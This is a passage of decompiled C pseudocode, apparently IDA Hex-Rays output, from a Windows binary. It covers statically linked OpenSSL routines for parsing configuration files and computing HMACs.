            v10 = *(_WORD *)(v9 + 2 * (unsigned __int8)*v5);
            if ( (v10 & 0x40) == 0 )
              break;
            ++v5;
            v11 = v8;
            v12 = *v5;
            for ( i = *(_WORD *)(v9 + 2 * (unsigned __int8)*v5); (i & 8) == 0; ++v4 )
            {
              if ( (char)v12 == v11 )
                break;
              if ( (i & 0x20) != 0 )
              {
                v12 = *++v5;
                if ( (*(_BYTE *)(v9 + 2 * v12) & 8) != 0 )
                  break;
              }
              *(_BYTE *)(v4 + Block[1]) = v12;
              v12 = v5[1];
              v9 = *(_DWORD *)(a1 + 4);
              ++v5;
              i = *(_WORD *)(v9 + 2 * v12);
            }
            if ( *v5 == v11 )
              ++v5;
          }
          if ( (*(_WORD *)(v9 + 2 * (unsigned __int8)*v5) & 0x400) == 0 )
            break;
          ++v5;
          v14 = v8;
          v15 = *v5;
          if ( (*(_BYTE *)(v9 + 2 * (unsigned __int8)*v5) & 8) == 0 )
          {
            do
            {
              if ( v15 == v14 )
              {
                if ( v5[1] != v14 )
                  break;
                ++v5;
              }
              *(_BYTE *)(v4 + Block[1]) = *v5;
              v15 = *++v5;
              ++v4;
            }
            while ( (*(_BYTE *)(*(_DWORD *)(a1 + 4) + 2 * (unsigned __int8)v15) & 8) == 0 );
          }
          if ( *v5 == v14 )
            ++v5;
        }
        if ( (v10 & 0x20) == 0 )
          break;
        v16 = v5[1];
        v5 += 2;
        if ( (*(_BYTE *)(v9 + 2 * v16) & 8) != 0 )
          goto LABEL_58;
        if ( v16 == 114 )
        {
          *(_BYTE *)(v4 + Block[1]) = 13;
          ++v4;
        }
        else if ( v16 == 110 )
        {
          *(_BYTE *)(v4 + Block[1]) = 10;
          ++v4;
        }
        else if ( v16 == 98 )
        {
          *(_BYTE *)(v4 + Block[1]) = 8;
          ++v4;
        }
        else
        {
          if ( v16 == 116 )
            v16 = 9;
          *(_BYTE *)(v4 + Block[1]) = v16;
          ++v4;
        }
      }
      if ( (v10 & 8) != 0 )
      {
LABEL_58:
        *(_BYTE *)(v4 + Block[1]) = 0;
        sub_413490(*a3);
        *a3 = (void *)Block[1];
        sub_413490(Block);
        return 1;
      }
      if ( v8 == 36 )
        break;
      *(_BYTE *)(v4 + Block[1]) = v8;
      ++v4;
      ++v5;
    }
    v17 = v5[1];
    v18 = v5 + 1;
    v31 = 0;
    if ( v17 == 123 )
    {
      v29 = 125;
LABEL_35:
      v18 = v5 + 2;
      goto LABEL_36;
    }
    if ( v17 == 40 )
    {
      v29 = 41;
      goto LABEL_35;
    }
    v29 = 0;
LABEL_36:
    VarName = v18;
    v19 = v18;
    if ( (*(_WORD *)(v9 + 2 * (unsigned __int8)*v18) & 0x107) != 0 )
    {
      do
        v20 = (unsigned __int8)*++v19;
      while ( (*(_WORD *)(v9 + 2 * v20) & 0x107) != 0 );
    }
    if ( *v19 == 58 && v19[1] == 58 )
    {
      *v19 = 0;
      v21 = (unsigned __int8)v19[2];
      v31 = v19;
      v19 += 2;
      v22 = v18;
      v23 = *(_DWORD *)(a1 + 4);
      v32 = 58;
      VarName = v19;
      if ( (*(_WORD *)(v23 + 2 * v21) & 0x107) != 0 )
      {
        do
          v24 = (unsigned __int8)*++v19;
        while ( (*(_WORD *)(v23 + 2 * v24) & 0x107) != 0 );
      }
    }
    else
    {
      v22 = a2;
    }
    v25 = *v19;
    v33 = *v19;
    *v19 = 0;
    v34 = v19;
    if ( v29 )
    {
      if ( v25 != v29 )
      {
        sub_408310(14, 101, 102, (int)"crypto\\conf\\conf_def.c", 491);
        goto LABEL_62;
      }
      ++v19;
    }
    v26 = sub_4CA790(a1, v22, VarName);
    if ( v31 )
      *v31 = v32;
    *v34 = v33;
    if ( !v26 )
    {
      sub_408310(14, 101, 104, (int)"crypto\\conf\\conf_def.c", 511);
      goto LABEL_62;
    }
    if ( !sub_4199A0((int)Block, (unsigned int)&v5[strlen(v26) - (_DWORD)v19 + *Block]) )
      break;
    for ( j = *v26; *v26; ++v4 )
    {
      ++v26;
      *(_BYTE *)(v4 + Block[1]) = j;
      j = *v26;
    }
    v5 = v19;
    *v34 = v33;
  }
  sub_408310(14, 101, 65, (int)"crypto\\conf\\conf_def.c", 516);
LABEL_62:
  sub_419810(Block);
  return 0;
}
// 4C99EF: variable 'v3' is possibly undefined

//----- (004C9D90) --------------------------------------------------------
unsigned __int8 *__cdecl sub_4C9D90(unsigned __int8 *a1)
{
  int v1; // ecx
  unsigned __int8 *result; // eax
  int v3; // edx
  __int16 i; // cx

  result = a1;
  v3 = *(_DWORD *)(v1 + 4);
  for ( i = *(_WORD *)(v3 + 2 * *a1); (i & 0x10) != 0; i = *(_WORD *)(v3 + 2 * *++result) )
  {
    if ( (i & 8) != 0 )
      break;
  }
  return result;
}
// 4C9D94: variable 'v1' is possibly undefined

//----- (004C9DC0) --------------------------------------------------------
unsigned __int8 *__cdecl sub_4C9DC0(unsigned __int8 *a1)
{
  int v1; // ecx
  unsigned __int8 *result; // eax
  int v3; // edx

  result = a1;
  v3 = *(_DWORD *)(v1 + 4);
  while ( 1 )
  {
    while ( (*(_WORD *)(v3 + 2 * *result) & 0x20) != 0 )
    {
      if ( (*(_BYTE *)(v3 + 2 * result[1]) & 8) != 0 )
        ++result;
      else
        result += 2;
    }
    if ( (*(_WORD *)(v3 + 2 * *result) & 0x307) == 0 )
      break;
    ++result;
  }
  return result;
}
// 4C9DC4: variable 'v1' is possibly undefined

//----- (004C9E00) --------------------------------------------------------
char *__usercall sub_4C9E00@<eax>(int a1@<edx>, char *a2)
{
  unsigned __int8 v2; // cl
  int v3; // esi
  int v4; // edi
  char *result; // eax
  __int16 v6; // dx
  int v7; // edx

  v2 = a2[1];
  v3 = *(_DWORD *)(a1 + 4);
  v4 = *a2;
  result = a2 + 1;
  v6 = *(_WORD *)(v3 + 2 * v2);
  if ( (v6 & 8) == 0 )
  {
    while ( (char)v2 != v4 )
    {
      if ( (v6 & 0x20) != 0 )
      {
        v7 = (unsigned __int8)*++result;
        if ( (*(_BYTE *)(v3 + 2 * v7) & 8) != 0 )
          return result;
      }
      v2 = *++result;
      v6 = *(_WORD *)(v3 + 2 * v2);
      if ( (v6 & 8) != 0 )
        break;
    }
  }
  if ( *result == v4 )
    ++result;
  return result;
}

//----- (004C9E60) --------------------------------------------------------
char *__usercall sub_4C9E60@<eax>(int a1@<edx>, char *a2)
{
  char v2; // cl
  int v3; // edx
  int v4; // esi
  char *result; // eax

  v2 = a2[1];
  v3 = *(_DWORD *)(a1 + 4);
  v4 = *a2;
  for ( result = a2 + 1; (*(_BYTE *)(v3 + 2 * (unsigned __int8)v2) & 8) == 0; ++result )
  {
    if ( v2 == v4 )
    {
      if ( result[1] != v4 )
        break;
      ++result;
    }
    v2 = result[1];
  }
  if ( *result == v4 )
    ++result;
  return result;
}

//----- (004C9EB0) --------------------------------------------------------
int __cdecl sub_4C9EB0(const char **a1, int a2)
{
  const char *v2; // ecx

  v2 = a1[1];
  if ( v2 )
    return sub_419190(a2, "[%s] %s=%s\n", *a1, v2, a1[2]);
  else
    return sub_419190(a2, "[[%s]]\n", *a1);
}

//----- (004C9EF0) --------------------------------------------------------
int __cdecl sub_4C9EF0(int a1, int a2)
{
  sub_424370(*(_DWORD **)(a1 + 8), (void (__cdecl *)(_DWORD, int))sub_4C9EB0, a2);
  return 1;
}

//----- (004C9F10) --------------------------------------------------------
int __cdecl sub_4C9F10(int a1, unsigned __int8 a2)
{
  return *(_WORD *)(*(_DWORD *)(a1 + 4) + 2 * a2) & 1;
}

//----- (004C9F30) --------------------------------------------------------
int __cdecl sub_4C9F30(int a1, char a2)
{
  return a2 - 48;
}

//----- (004C9F40) --------------------------------------------------------
int __cdecl sub_4C9F40(_DWORD *Block)
{
  if ( !Block )
    return 0;
  sub_4CAAE0(Block);
  sub_413490(Block);
  return 1;
}

//----- (004C9F70) --------------------------------------------------------
char *__usercall sub_4C9F70@<eax>(int a1@<edi>, char *a2)
{
  char *result; // eax
  int v3; // esi
  int v4; // edx
  __int16 v5; // cx

  result = a2;
  v3 = *(_DWORD *)(a1 + 4);
  if ( (*(_WORD *)(v3 + 2 * (unsigned __int8)*a2) & 0x800) == 0 )
  {
    while ( (*(_BYTE *)(v3 + 2 * (unsigned __int8)*result) & 0x10) != 0 )
    {
      v4 = (unsigned __int8)*++result;
      if ( (*(_WORD *)(v3 + 2 * v4) & 0x800) != 0 )
      {
        *result = 0;
        return result;
      }
    }
    while ( *(char *)(v3 + 2 * (unsigned __int8)*result) >= 0 )
    {
      v5 = *(_WORD *)(v3 + 2 * (unsigned __int8)*result);
      if ( (v5 & 0x400) != 0 )
      {
        result = sub_4C9E60(a1, result);
      }
      else if ( (v5 & 0x40) != 0 )
      {
        result = sub_4C9E00(a1, result);
      }
      else
      {
        if ( (v5 & 0x20) == 0 )
        {
          if ( (v5 & 8) != 0 )
            return result;
LABEL_14:
          ++result;
          continue;
        }
        if ( (*(_BYTE *)(v3 + 2 * (unsigned __int8)result[1]) & 8) != 0 )
          goto LABEL_14;
        result += 2;
      }
    }
  }
  *result = 0;
  return result;
}

//----- (004CA010) --------------------------------------------------------
int __cdecl sub_4CA010(int a1, int a2, _DWORD *a3)
{
  int v3; // edx
  int v4; // ebx
  _DWORD *v5; // ebp
  void *v6; // esi
  int v7; // esi
  int v8; // eax
  int v9; // edx
  char v10; // cl
  int v11; // ebx
  int v12; // ecx
  int v13; // esi
  int v14; // eax
  int v15; // ecx
  char *v16; // esi
  unsigned __int8 *v17; // eax
  int v18; // ebp
  unsigned __int8 *v19; // esi
  unsigned __int8 v20; // al
  unsigned __int8 *j; // esi
  unsigned __int8 *v22; // eax
  int v23; // ecx
  unsigned __int8 *k; // edx
  int v25; // ecx
  void *v26; // esi
  unsigned __int8 *v27; // eax
  unsigned __int8 *v28; // ebp
  unsigned __int8 *v29; // eax
  unsigned __int8 *v30; // esi
  unsigned __int8 *v31; // ebx
  int v32; // eax
  int v33; // edx
  unsigned __int8 *m; // esi
  void **v35; // esi
  char *v36; // eax
  void **v37; // esi
  void *v38; // esi
  _DWORD *v39; // eax
  void **v41; // esi
  _DWORD *v42; // [esp-Ch] [ebp-60h]
  void *Block; // [esp+10h] [ebp-44h] BYREF
  void *Src; // [esp+14h] [ebp-40h]
  void *v45; // [esp+18h] [ebp-3Ch]
  unsigned __int8 *v46; // [esp+1Ch] [ebp-38h]
  int i; // [esp+20h] [ebp-34h]
  void *v48; // [esp+24h] [ebp-30h]
  int v49; // [esp+28h] [ebp-2Ch]
  const char *v50; // [esp+2Ch] [ebp-28h]
  int v51; // [esp+30h] [ebp-24h]
  _DWORD *v52; // [esp+34h] [ebp-20h]
  int v53; // [esp+38h] [ebp-1Ch]
  _DWORD *v54; // [esp+3Ch] [ebp-18h]
  char v55[16]; // [esp+40h] [ebp-14h] BYREF

  v3 = *(_DWORD *)(a1 + 8);
  v4 = 0;
  v52 = (_DWORD *)a2;
  v54 = a3;
  v49 = 0;
  v45 = 0;
  Block = 0;
  v53 = v3;
  v5 = sub_4197E0();
  v48 = v5;
  if ( v5 )
  {
    v6 = sub_4247B0("default");
    Block = v6;
    if ( v6 )
    {
      if ( sub_4CA920(a1) )
      {
        v46 = (unsigned __int8 *)sub_4CAA20(a1, v6);
        if ( v46 )
        {
          i = 0;
          if ( sub_4198C0((int)v5, 0x200u) )
          {
            while ( 1 )
            {
              v7 = v4 + v5[1];
              v42 = v52;
              *(_BYTE *)v7 = 0;
              sub_405290(v42, v7, 511);
              *(_BYTE *)(v7 + 511) = 0;
              v8 = strlen((const char *)v7);
              v9 = v8;
              if ( !v8 && !i )
              {
                sub_419810(v5);
                sub_413490(Block);
                return 1;
              }
              for ( i = 0; v8 > 0; --v8 )
              {
                v10 = *(_BYTE *)(v7 + v8 - 1);
                if ( v10 != 13 && v10 != 10 )
                  break;
              }
              if ( v9 && v8 == v9 )
              {
                i = 1;
              }
              else
              {
                ++v49;
                *(_BYTE *)(v8 + v7) = 0;
              }
              v11 = v8 + v4;
              v51 = v11;
              v45 = 0;
              if ( v11 < 1
                || (v12 = v5[1],
                    v13 = *(unsigned __int8 *)(v12 + v11 - 1),
                    v14 = v12 + v11 - 1,
                    v15 = *(_DWORD *)(a1 + 4),
                    (*(_BYTE *)(v15 + 2 * v13) & 0x20) == 0)
                || v11 > 1 && (*(_BYTE *)(v15 + 2 * *(unsigned __int8 *)(v14 - 1)) & 0x20) != 0 )
              {
                if ( !i )
                {
                  v16 = (char *)*((_DWORD *)v48 + 1);
                  v51 = 0;
                  sub_4C9F70(a1, v16);
                  v17 = sub_4C9D90((unsigned __int8 *)v16);
                  v18 = *(_DWORD *)(a1 + 4);
                  v19 = v17;
                  v20 = *v17;
                  if ( (*(_BYTE *)(v18 + 2 * v20) & 8) == 0 )
                  {
                    if ( v20 == 91 )
                    {
                      v46 = sub_4C9D90(v19 + 1);
                      for ( j = v46; ; j = k )
                      {
                        v22 = sub_4C9DC0(j);
                        v23 = 2 * *v22;
                        for ( k = v22; (*(_BYTE *)(v23 + v18) & 0x10) != 0; v23 = 2 * v25 )
                        {
                          if ( (*(_BYTE *)(v23 + v18) & 8) != 0 )
                            break;
                          v25 = *++k;
                        }
                        if ( *k == 93 )
                          break;
                        if ( !*k || j == k )
                        {
                          sub_408310(14, 121, 100, (int)"crypto\\conf\\conf_def.c", 267);
                          goto LABEL_71;
                        }
                      }
                      *v22 = 0;
                      if ( !sub_4C99E0(a1, 0, &Block) )
                        goto LABEL_71;
                      v26 = Block;
                      v46 = (unsigned __int8 *)sub_4CA680(a1, (int)Block);
                      if ( !v46 )
                      {
                        v46 = (unsigned __int8 *)sub_4CAA20(a1, v26);
                        if ( !v46 )
                        {
                          sub_408310(14, 121, 103, (int)"crypto\\conf\\conf_def.c", 277);
                          goto LABEL_71;
                        }
                      }
                    }
                    else
                    {
                      v50 = (const char *)v19;
                      Src = 0;
                      v27 = sub_4C9DC0(v19);
                      v28 = v27;
                      if ( *v27 == 58 && v27[1] == 58 )
                      {
                        *v27 = 0;
                        Src = v19;
                        v50 = (const char *)(v27 + 2);
                        v28 = sub_4C9DC0(v27 + 2);
                      }
                      v29 = sub_4C9D90(v28);
                      if ( *v29 != 61 )
                      {
                        sub_408310(14, 121, 101, (int)"crypto\\conf\\conf_def.c", 294);
                        goto LABEL_71;
                      }
                      v30 = v29 + 1;
                      *v28 = 0;
                      v31 = sub_4C9D90(v29 + 1);
                      v32 = *(_DWORD *)(a1 + 4);
                      if ( (*(_BYTE *)(v32 + 2 * *v30) & 8) == 0 )
                      {
                        do
                          v33 = *++v30;
                        while ( (*(_BYTE *)(v32 + 2 * v33) & 8) == 0 );
                      }
                      for ( m = v30 - 1; m != v31; --m )
                      {
                        if ( (*(_BYTE *)(v32 + 2 * *m) & 0x10) == 0 )
                          break;
                      }
                      m[1] = 0;
                      v35 = (void **)sub_4133F0(0xCu);
                      v45 = v35;
                      if ( !v35 )
                      {
                        sub_408310(14, 121, 65, (int)"crypto\\conf\\conf_def.c", 309);
                        goto LABEL_71;
                      }
                      if ( !Src )
                        Src = Block;
                      v36 = (char *)sub_4133F0(strlen(v50) + 1);
                      v35[1] = v36;
                      v37 = v35 + 2;
                      *v37 = 0;
                      if ( !v36 )
                      {
                        sub_408310(14, 121, 65, (int)"crypto\\conf\\conf_def.c", 317);
                        goto LABEL_71;
                      }
                      sub_424880(v36, v50, strlen(v50) + 1);
                      if ( !sub_4C99E0(a1, (const char *)Src, v37) )
                        goto LABEL_71;
                      v38 = Src;
                      if ( !strcmp((const char *)Src, (const char *)Block) )
                      {
                        v39 = v46;
                      }
                      else
                      {
                        v39 = sub_4CA680(a1, (int)Src);
                        if ( !v39 )
                        {
                          v39 = sub_4CAA20(a1, v38);
                          if ( !v39 )
                          {
                            sub_408310(14, 121, 103, (int)"crypto\\conf\\conf_def.c", 330);
                            goto LABEL_71;
                          }
                        }
                      }
                      if ( !sub_4CA710(a1, v39, v45) )
                      {
                        sub_408310(14, 121, 65, (int)"crypto\\conf\\conf_def.c", 336);
                        goto LABEL_71;
                      }
                      v45 = 0;
                    }
                  }
                }
              }
              else
              {
                v51 = v11 - 1;
                i = 1;
              }
              if ( !sub_4198C0((int)v48, v51 + 512) )
                break;
              v4 = v51;
              v5 = v48;
            }
          }
          sub_408310(14, 121, 7, (int)"crypto\\conf\\conf_def.c", 198);
        }
        else
        {
          sub_408310(14, 121, 103, (int)"crypto\\conf\\conf_def.c", 190);
        }
      }
      else
      {
        sub_408310(14, 121, 65, (int)"crypto\\conf\\conf_def.c", 184);
      }
    }
    else
    {
      sub_408310(14, 121, 65, (int)"crypto\\conf\\conf_def.c", 179);
    }
  }
  else
  {
    sub_408310(14, 121, 7, (int)"crypto\\conf\\conf_def.c", 173);
  }
LABEL_71:
  sub_419810(v48);
  sub_413490(Block);
  if ( v54 )
    *v54 = v49;
  sub_4191B0((int)v55, 13, "%ld", v49);
  sub_408610(2, "line ", v55);
  if ( v53 != *(_DWORD *)(a1 + 8) )
  {
    sub_462C60(*(_DWORD *)(a1 + 8));
    *(_DWORD *)(a1 + 8) = 0;
  }
  v41 = (void **)v45;
  if ( v45 )
  {
    sub_413490(*((void **)v45 + 1));
    sub_413490(v41[2]);
    sub_413490(v41);
  }
  return 0;
}

//----- (004CA5F0) --------------------------------------------------------
int __cdecl sub_4CA5F0(int a1, LPCCH lpMultiByteStr, _DWORD *a3)
{
  volatile LONG *v3; // eax
  volatile LONG *v4; // esi
  int v6; // edi

  v3 = sub_4196B0(lpMultiByteStr, "rb");
  v4 = v3;
  if ( v3 )
  {
    v6 = sub_4CA010(a1, (int)v3, a3);
    sub_404F50(v4);
    return v6;
  }
  else
  {
    if ( (sub_408760() & 0xFFF) == 128 )
      sub_408310(14, 120, 114, (int)"crypto\\conf\\conf_def.c", 144);
    else
      sub_408310(14, 120, 2, (int)"crypto\\conf\\conf_def.c", 146);
    return 0;
  }
}

//----- (004CA680) --------------------------------------------------------
_DWORD *__cdecl sub_4CA680(int a1, int a2)
{
  int v3; // [esp-8h] [ebp-14h]
  int v4[3]; // [esp+0h] [ebp-Ch] BYREF

  if ( !a1 || !a2 )
    return 0;
  v4[0] = a2;
  v3 = *(_DWORD *)(a1 + 8);
  v4[1] = 0;
  return sub_424780(v3, (int)v4);
}

//----- (004CA710) --------------------------------------------------------
int __cdecl sub_4CA710(int a1, _DWORD *a2, _DWORD *a3)
{
  int *v3; // edi
  int result; // eax
  void **v5; // eax
  void **v6; // esi

  v3 = (int *)a2[2];
  *a3 = *a2;
  result = sub_4269B0(v3, (int)a3);
  if ( result )
  {
    v5 = (void **)sub_424680(*(_DWORD **)(a1 + 8), (int)a3);
    v6 = v5;
    if ( v5 )
    {
      sub_426B00(v3, (int)v5);
      sub_413490(v6[1]);
      sub_413490(v6[2]);
      sub_413490(v6);
    }
    return 1;
  }
  return result;
}

//----- (004CA790) --------------------------------------------------------
char *__cdecl sub_4CA790(int a1, const char *a2, char *VarName)
{
  char *result; // eax
  _DWORD *v4; // eax
  int v5; // [esp-10h] [ebp-20h]
  int v6; // [esp-10h] [ebp-20h]
  const char *v7; // [esp+4h] [ebp-Ch] BYREF
  char *v8; // [esp+8h] [ebp-8h]

  if ( !VarName )
    return 0;
  if ( !a1 )
    return getenv(VarName);
  if ( !a2 )
    goto LABEL_8;
  v5 = *(_DWORD *)(a1 + 8);
  v8 = VarName;
  v7 = a2;
  v4 = sub_424780(v5, (int)&v7);
  if ( v4 )
    return (char *)v4[2];
  if ( strcmp(a2, "ENV") || (result = getenv(VarName)) == 0 )
  {
LABEL_8:
    v6 = *(_DWORD *)(a1 + 8);
    v7 = "default";
    v8 = VarName;
    v4 = sub_424780(v6, (int)&v7);
    if ( !v4 )
      return 0;
    return (char *)v4[2];
  }
  return result;
}

//----- (004CA860) --------------------------------------------------------
int __cdecl sub_4CA860(_BYTE **a1)
{
  int v1; // edi

  v1 = sub_424590(a1[1]);
  return v1 ^ (4 * sub_424590(*a1));
}

//----- (004CA890) --------------------------------------------------------
int __cdecl sub_4CA890(int a1, int a2)
{
  int result; // eax
  _BYTE *v3; // eax
  _BYTE *v4; // ecx
  bool v5; // cf
  unsigned __int8 v6; // dl

  if ( *(_DWORD *)a1 == *(_DWORD *)a2 || (result = strcmp(*(const char **)a1, *(const char **)a2)) == 0 )
  {
    v3 = *(_BYTE **)(a1 + 4);
    if ( v3 && (v4 = *(_BYTE **)(a2 + 4)) != 0 )
    {
      while ( 1 )
      {
        v5 = *v3 < *v4;
        if ( *v3 != *v4 )
          break;
        if ( !*v3 )
          return 0;
        v6 = v3[1];
        v5 = v6 < v4[1];
        if ( v6 != v4[1] )
          break;
        v3 += 2;
        v4 += 2;
        if ( !v6 )
          return 0;
      }
      return -v5 - (v5 - 1);
    }
    else if ( v3 == *(_BYTE **)(a2 + 4) )
    {
      return 0;
    }
    else
    {
      return 2 * (v3 != 0) - 1;
    }
  }
  return result;
}

//----- (004CA920) --------------------------------------------------------
BOOL __cdecl sub_4CA920(int a1)
{
  BOOL result; // eax
  _DWORD *v2; // eax

  result = 0;
  if ( a1 )
  {
    if ( *(_DWORD *)(a1 + 8) )
      return 1;
    v2 = sub_4245F0((int (__cdecl *)(_BYTE *))sub_4CA860, (int (__cdecl *)(const char *, const char *))sub_4CA890);
    *(_DWORD *)(a1 + 8) = v2;
    if ( v2 )
      return 1;
  }
  return result;
}

//----- (004CA960) --------------------------------------------------------
int __cdecl sub_4CA960(int a1, _DWORD *a2)
{
  int result; // eax

  result = a1;
  if ( *(_DWORD *)(a1 + 4) )
    return sub_424710(a2, a1);
  return result;
}

//----- (004CA980) --------------------------------------------------------
void __cdecl sub_4CA980(void **Block)
{
  int *v1; // ebx
  int i; // edi
  void **v3; // esi

  if ( !Block[1] )
  {
    v1 = (int *)Block[2];
    for ( i = sub_426A30((int)v1) - 1; i >= 0; --i )
    {
      v3 = (void **)sub_426A40(v1, i);
      sub_413490(v3[2]);
      sub_413490(v3[1]);
      sub_413490(v3);
    }
    sub_4269F0((void **)v1);
    sub_413490(*Block);
    sub_413490(Block);
  }
}

//----- (004CAA20) --------------------------------------------------------
_DWORD *__cdecl sub_4CAA20(int a1, void *Src)
{
  _DWORD *v2; // esi
  void **v3; // ebx
  unsigned int v4; // kr00_4
  void *v5; // eax

  v2 = 0;
  v3 = (void **)sub_426AF0();
  if ( v3 && (v2 = sub_4133F0(0xCu)) != 0 && (v4 = strlen((const char *)Src), v5 = sub_4133F0(v4 + 1), (*v2 = v5) != 0) )
  {
    memcpy(v5, Src, v4 + 1);
    v2[1] = 0;
    v2[2] = v3;
    if ( sub_424680(*(_DWORD **)(a1 + 8), (int)v2) )
      sub_417C70("assertion failed: vv == NULL", "crypto\\conf\\conf_api.c", 207);
    return v2;
  }
  else
  {
    sub_4269F0(v3);
    sub_413490(v2);
    return 0;
  }
}

//----- (004CAAE0) --------------------------------------------------------
void __cdecl sub_4CAAE0(_DWORD *Block)
{
  int v1; // eax

  if ( Block )
  {
    v1 = Block[2];
    if ( v1 )
    {
      sub_404FE0(v1, 0);
      sub_424370((_DWORD *)Block[2], (void (__cdecl *)(_DWORD, int))sub_4CA960, Block[2]);
      sub_424330((_DWORD *)Block[2], (void (__cdecl *)(_DWORD))sub_4CA980);
      sub_424260((void **)Block[2]);
    }
  }
}

//----- (004CAB30) --------------------------------------------------------
BOOL __cdecl sub_4CAB30(int **a1, void *Src, int Size, int *a4, volatile LONG *a5)
{
  int *v5; // ebx
  int v6; // eax
  int v7; // ebp
  int *v8; // edi
  int v10; // edi
  int i; // eax
  int j; // eax
  char v13[128]; // [esp+10h] [ebp-84h]

  v5 = a4;
  v6 = 0;
  if ( a4 )
  {
    if ( a4 != *a1 && (!Src || Size < 0) )
      return 0;
    v6 = 1;
    *a1 = a4;
  }
  else
  {
    v5 = *a1;
    if ( !*a1 )
      return 0;
  }
  if ( !Src )
  {
    if ( !v6 )
      return sub_42BAA0((int)a1[1], (int)a1[2]) != 0;
    goto LABEL_20;
  }
  v7 = sub_44CEB0((int)v5);
  if ( v7 > 128 )
    sub_417C70("assertion failed: j <= (int)sizeof(ctx->key)", "crypto\\hmac\\hmac.c", 40);
  if ( v7 < Size )
  {
    if ( !sub_42B860((int)a1[1], v5, a5) )
      return 0;
    if ( !sub_42BA10((int)a1[1]) )
      return 0;
    v8 = (int *)(a1 + 4);
    if ( !sub_42BA20((_BYTE **)a1[1], (int)(a1 + 5), a1 + 4) )
      return 0;
    goto LABEL_17;
  }
  if ( (unsigned int)Size > 0x80 )
    return 0;
  memcpy(a1 + 5, Src, Size);
  v8 = (int *)(a1 + 4);
  a1[4] = (int *)Size;
LABEL_17:
  v10 = *v8;
  if ( v10 != 128 )
    memset((char *)a1 + v10 + 20, 0, 128 - v10);
LABEL_20:
  for ( i = 0; i < 128; ++i )
    v13[i] = *((_BYTE *)a1 + i + 20) ^ 0x36;
  if ( !sub_42B860((int)a1[2], v5, a5) )
    return 0;
  sub_44CEB0((int)v5);
  if ( !sub_42BA10((int)a1[2]) )
    return 0;
  for ( j = 0; j < 128; ++j )
    v13[j] = *((_BYTE *)a1 + j + 20) ^ 0x5C;
  if ( !sub_42B860((int)a1[3], v5, a5) )
    return 0;
  sub_44CEB0((int)v5);
  if ( !sub_42BA10((int)a1[3]) )
    return 0;
  return sub_42BAA0((int)a1[1], (int)a1[2]) != 0;
}
// 4CAB30: using guessed type char var_84[128];

//----- (004CAD60) --------------------------------------------------------
int __cdecl sub_4CAD60(_DWORD *a1)
{
  if ( *a1 )
    return sub_42BA10(a1[1]);
  else
    return 0;
}

//----- (004CAD80) --------------------------------------------------------
BOOL __cdecl sub_4CAD80(_DWORD *a1, int a2, _DWORD *a3)
{
  int v4; // [esp+Ch] [ebp-48h] BYREF
  char v5[64]; // [esp+10h] [ebp-44h] BYREF

  return *a1
      && sub_42BA20((_BYTE **)a1[1], (int)v5, &v4)
      && sub_42BAA0(a1[1], a1[3])
      && sub_42BA10(a1[1])
      && sub_42BA20((_BYTE **)a1[1], a2, a3);
}
// 4CAD80: using guessed type char var_44[64];

//----- (004CAE30) --------------------------------------------------------
void __cdecl sub_4CAE30(_BYTE **Block)
{
  if ( Block )
  {
    sub_42B790(Block[2]);
    sub_42B790(Block[3]);
    sub_42B790(Block[1]);
    *Block = 0;
    Block[4] = 0;
    sub_4139E0((_BYTE *)Block + 20, 0x80u);
    sub_42B840(Block[2]);
    sub_42B840(Block[3]);
    sub_42B840(Block[1]);
    sub_413490(Block);
  }
}

//----- (004CAEA0) --------------------------------------------------------
int __cdecl sub_4CAEA0(int a1)
{
  void *v1; // eax
  void *v2; // eax
  void *v3; // eax

  sub_42B790(*(_BYTE **)(a1 + 8));
  sub_42B790(*(_BYTE **)(a1 + 12));
  sub_42B790(*(_BYTE **)(a1 + 4));
  *(_DWORD *)a1 = 0;
  *(_DWORD *)(a1 + 16) = 0;
  sub_4139E0((_BYTE *)(a1 + 20), 0x80u);
  if ( (*(_DWORD *)(a1 + 8) || (v1 = sub_42B820(), (*(_DWORD *)(a1 + 8) = v1) != 0))
    && (*(_DWORD *)(a1 + 12) || (v2 = sub_42B820(), (*(_DWORD *)(a1 + 12) = v2) != 0))
    && (*(_DWORD *)(a1 + 4) || (v3 = sub_42B820(), (*(_DWORD *)(a1 + 4) = v3) != 0)) )
  {
    *(_DWORD *)a1 = 0;
    return 1;
  }
  else
  {
    sub_42B790(*(_BYTE **)(a1 + 8));
    sub_42B790(*(_BYTE **)(a1 + 12));
    sub_42B790(*(_BYTE **)(a1 + 4));
    *(_DWORD *)a1 = 0;
    *(_DWORD *)(a1 + 16) = 0;
    sub_4139E0((_BYTE *)(a1 + 20), 0x80u);
    return 0;
  }
}

//----- (004CAF60) --------------------------------------------------------
int __cdecl sub_4CAF60(_DWORD *a1, _DWORD *a2)
{
  if ( sub_4CAEA0((int)a1) && sub_42BAA0(a1[2], a2[2]) && sub_42BAA0(a1[3], a2[3]) && sub_42BAA0(a1[1], a2[1]) )
  {
    qmemcpy(a1 + 5, a2 + 5, 0x80u);
    a1[4] = a2[4];
    *a1 = *a2;
    return 1;
  }
  else
  {
    sub_42B790((_BYTE *)a1[2]);
    sub_42B790((_BYTE *)a1[3]);
    sub_42B790((_BYTE *)a1[1]);
    *a1 = 0;
    a1[4] = 0;
    sub_4139E0((_BYTE *)a1 + 20, 0x80u);
    return 0;
  }
}

//----- (004CB020) --------------------------------------------------------
int __cdecl sub_4CB020(int *a1, int a2)
{
  sub_407590(a1[2], a2);
  sub_407590(a1[3], a2);
  return sub_407590(a1[1], a2);
}

//----- (004CB050) --------------------------------------------------------
_BYTE **sub_4CB050()
{
  _BYTE **v0; // eax
  _BYTE **v1; // esi

  v0 = (_BYTE **)sub_413430(0x94u);
  v1 = v0;
  if ( !v0 || sub_4CAEA0((int)v0) )
    return v1;
  sub_4CAE30(v1);
  return 0;
}

//----- (004CB090) --------------------------------------------------------
void *__cdecl sub_4CB090(int *a1, void *Src, int Size, int a4, int a5, void *a6, _DWORD *a7)
{
  void *v7; // edi
  _DWORD *v8; // eax
  _DWORD *v9; // esi
  void *v11; // eax

  v7 = a6;
  if ( !a6 )
    v7 = &unk_5393D0;
  v8 = sub_413430(0x94u);
  v9 = v8;
  if ( !v8 )
    goto LABEL_14;
  if ( !sub_4CAEA0((int)v8) )
  {
    sub_4CAE30((_BYTE **)v9);
    sub_4CAE30(0);
    return 0;
  }
  if ( !v9 )
    goto LABEL_14;
  v11 = Src;
  if ( !Src && !Size )
    v11 = &unk_52AB55;
  if ( sub_4CAB30((int **)v9, v11, Size, a1, 0) && *v9 && sub_42BA10(v9[1]) && sub_4CAD80(v9, (int)v7, a7) )
  {
    sub_4CAE30((_BYTE **)v9);
    return v7;
  }
